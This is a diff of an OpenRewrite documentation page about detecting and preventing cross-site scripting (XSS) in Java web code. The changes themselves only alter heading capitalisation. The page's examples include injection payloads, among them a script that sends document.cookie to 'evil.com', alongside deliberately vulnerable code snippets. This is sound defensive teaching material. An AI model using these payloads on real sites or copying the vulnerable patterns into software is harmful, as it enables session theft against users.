@@ -35,11 +35,11 @@ response.getWriter().write("<div>" + saved + "</div>");
 // </script>
 ```
 
-## How OpenRewrite Detects XSS
+## How OpenRewrite detects XSS
 
 The `FindXssVulnerability` recipe tracks untrusted data from various sources to HTML output sinks:
 
-### 1. Identifying Sources
+### 1. Identifying sources
 
 The first step in preventing XSS is knowing where untrusted data enters your application. Think of these as the "entry points" where an attacker might try to inject malicious code. Any data that comes from outside your application's control should be treated as potentially dangerous until proven otherwise.
 
@@ -60,7 +60,7 @@ Files.readString(uploadedFile)          // User uploads
 properties.getProperty("user.data")     // Configuration
 ```
 
-### 2. Tracking Through Transformations
+### 2. Tracking through transformations
 
 Malicious data doesn't stay in one place – it flows through your application, getting combined with other strings, trimmed, formatted, and passed between methods. Each transformation preserves the "tainted" nature of the data. OpenRewrite's taint analysis follows these transformations to ensure that dangerous input is tracked no matter how it's modified.
 
@@ -72,7 +72,7 @@ String wrapped = "<div>" + message + "</div>";      // TAINTED
 response.getWriter().write(wrapped);                // XSS VULNERABILITY!
 ```
 
-### 3. Identifying HTML Output Sinks
+### 3. Identifying HTML output sinks
 
 The final piece of the XSS puzzle is where data gets written to HTML responses. These "sinks" are the places where tainted data becomes executable code in a user's browser. OpenRewrite recognizes various output methods across different frameworks and libraries, helping you spot vulnerabilities regardless of your tech stack.
 
@@ -92,9 +92,9 @@ modelAndView.addObject("html", taintedData)
 model.put("rawHtml", taintedData)  // If template uses {{{rawHtml}}}
 ```
 
-## Common XSS Patterns
+## Common XSS patterns
 
-### Basic Reflection
+### Basic reflection
 
 The most straightforward XSS vulnerability occurs when user input is directly embedded into HTML without any encoding. This pattern is surprisingly common in legacy code or quick prototypes that never got properly secured.
 
@@ -111,7 +111,7 @@ public void search(HttpServletRequest request, HttpServletResponse response)
 // Attack: ?q=<script>document.location='http://evil.com?c='+document.cookie</script>
 ```
 
-### Attribute Injection
+### Attribute injection
 
 HTML attributes present a special challenge because attackers can break out of the attribute context even when developers think they're being careful. Quotes alone won't save you—attackers know how to escape them.
 
@@ -128,7 +128,7 @@ response.getWriter().write("<div title='" + title + "'>Content</div>");
 // Attack: ?title=x' onmouseover='alert(1)
 ```
 
-### JavaScript Context
+### JavaScript context
 
 Embedding user data directly into JavaScript code is particularly dangerous because you're literally putting untrusted data into an execution context. The attacker's payload becomes part of your application's logic.
 
@@ -142,7 +142,7 @@ response.getWriter().write(
 // Result: <script>var user = 'x'; alert(1); //'; processUser(user);</script>
 ```
 
-### JSON Injection
+### JSON injection
 
 JSON data embedded in script tags needs special attention. While `JSON.stringify()` helps, manually building JSON strings opens the door to injection attacks that can break out of the data context.
 
@@ -155,9 +155,9 @@ response.getWriter().write(
 // Attack: ?data=x'}; alert(1); //
 ```
 
-## Safe Patterns and Remediation
+## Safe patterns and remediation
 
-### HTML Entity Encoding
+### HTML entity encoding
 
 HTML entity encoding is your first and most important line of defense against XSS. By converting dangerous characters like `<`, `>`, and `"` into their HTML entity equivalents (`&lt;`, `&gt;`, `&quot;`), you ensure that user input is displayed as text rather than executed as code.
 
@@ -185,7 +185,7 @@ response.getWriter().write(
 );
 ```
 
-### Using Framework Protection
+### Using framework protection
 
 Modern frameworks have learned from years of XSS vulnerabilities and now provide automatic escaping by default. Understanding how your framework handles output encoding lets you write secure code without constantly worrying about XSS.
 
@@ -204,7 +204,7 @@ public String profile(@RequestParam String name, Model model) {
 // <sec:authentication property="principal.username" htmlEscape="true"/>
 ```
 
-### Content Security Policy
+### Content security policy
 
 Content Security Policy (CSP) acts as a safety net by telling browsers which scripts are allowed to run. Even if an XSS vulnerability exists, CSP can prevent the injected script from executing, turning a critical vulnerability into a minor annoyance.
 
@@ -223,7 +223,7 @@ public class SecurityHeadersFilter implements Filter {
 }
 ```
 
-### Context-Aware Encoding
+### Context-aware encoding
 
 One encoding method doesn't fit all situations. HTML content, attributes, JavaScript, CSS, and URLs each have their own special characters and escape sequences. Using the right encoding for each context ensures comprehensive protection.
 
@@ -251,9 +251,9 @@ public class SafeHtmlBuilder {
 }
 ```
 
-## Advanced XSS Detection Features
+## Advanced XSS detection features
 
-### Stored XSS Detection
+### Stored XSS detection
 
 Stored XSS is particularly dangerous because the malicious code persists in your database, affecting every user who views the infected content. OpenRewrite tracks tainted data even when it takes a detour through your database, helping you catch these delayed-action vulnerabilities.
 
@@ -276,7 +276,7 @@ public void displayComments(HttpServletResponse response) {
 }
 ```
 
-### Rich Content Handling
+### Rich content handling
 
 Allowing users to submit formatted content (like blog posts or comments with basic HTML) creates a tricky balance between functionality and security. Simple regex-based filtering rarely works – attackers are creative and will find ways around your patterns.
 
@@ -299,7 +299,7 @@ public String processRichText(String userHtml) {
 }
 ```
 
-### Template Injection Detection
+### Template injection detection
 
 Template engines add another layer of complexity to XSS prevention. When user input controls which template gets rendered or what expressions get evaluated, attackers can potentially execute arbitrary code on your server, not just in browsers.
 
@@ -315,9 +315,9 @@ model.addAttribute("userExpression", request.getParameter("expr"));
 // Template: <div th:utext="${userExpression}"></div>  // Unescaped output!
 ```
 
-## Recipe Configuration
+## Recipe configuration
 
-### Basic Usage
+### Basic usage
 
 ```yaml
 # In rewrite.yml
@@ -328,7 +328,7 @@ recipeList:
   - org.openrewrite.analysis.java.security.FindXssVulnerability
 ```
 
-### Custom XSS Detection
+### Custom XSS detection
 
 Every application has its own unique patterns and custom frameworks. OpenRewrite's XSS detection can be extended to understand your specific code patterns, ensuring that your custom HTML rendering methods don't become security blind spots.
 
@@ -368,7 +368,7 @@ public class CustomXssRecipe extends FindXssVulnerability {
 }
 ```
 
-## Framework-Specific Considerations
+## Framework-specific considerations
 
 ### Spring MVC
 
@@ -393,7 +393,7 @@ public String raw(@RequestParam String html) {
 }
 ```
 
-### JSP Best Practices
+### JSP best practices
 
 JSP has been around for decades, and its various expression languages offer different levels of protection. Knowing which syntax automatically escapes output and which doesn't can save you from introducing vulnerabilities in legacy codebases.
 
@@ -411,7 +411,7 @@ JSP has been around for decades, and its various expression languages offer diff
 ${fn:escapeXml(param.userInput)}
 ```
 
-### React/Angular Integration
+### React/Angular integration
 
 Single-page applications handle XSS differently than traditional server-rendered pages. When your backend becomes a pure API, the responsibility for encoding shifts to the frontend framework. Modern frameworks like React and Angular escape by default, but you still need to be careful about how you structure your API responses.
 
@@ -431,9 +431,9 @@ public class ApiController {
 // Angular: {{userData.name}} // Auto-escaped
 ```
 
-## Testing XSS Detection
+## Testing XSS detection
 
-### Unit Tests
+### Unit tests
 
 Testing your XSS detection rules ensures they catch real vulnerabilities without flooding you with false positives. These tests demonstrate both vulnerable patterns that should be flagged and safe patterns that shouldn't trigger warnings.
 
@@ -476,9 +476,9 @@ void allowsProperlyEncodedOutput() {
 }
 ```
 
-## Common Challenges
+## Common challenges
 
-### False Positives
+### False positives
 
 Not every instance of writing user data to output is dangerous. Understanding when XSS isn't possible helps you focus on real vulnerabilities and avoid alert fatigue from false positives.
 
@@ -498,7 +498,7 @@ public void trustedHtmlOutput(String trustedHtml) {
 }
 ```
 
-### Complex Data Flows
+### Complex data flows
 
 Real applications rarely have simple, direct flows from input to output. Data passes through collections, gets transformed by streams, and moves between objects. OpenRewrite's taint analysis tracks these complex paths to ensure nothing slips through.
 
@@ -515,14 +515,14 @@ String html = inputs.stream()
 response.getWriter().write("<ul>" + html + "</ul>");  // XSS!
 ```
 
-## Performance Considerations
+## Performance considerations
 
 XSS detection is typically fast because:
 1. **Focused on I/O**: Only analyzes request handling and response generation
 2. **Early termination**: Stops tracking when data is sanitized
 3. **Common patterns**: Optimized for typical web frameworks
 
-## Next Steps
+## Next steps
 
 * [SQL Injection](./sql-injection.md) - Similar taint analysis for database queries
 * [Command Injection](./command-injection.md) - OS command vulnerabilities
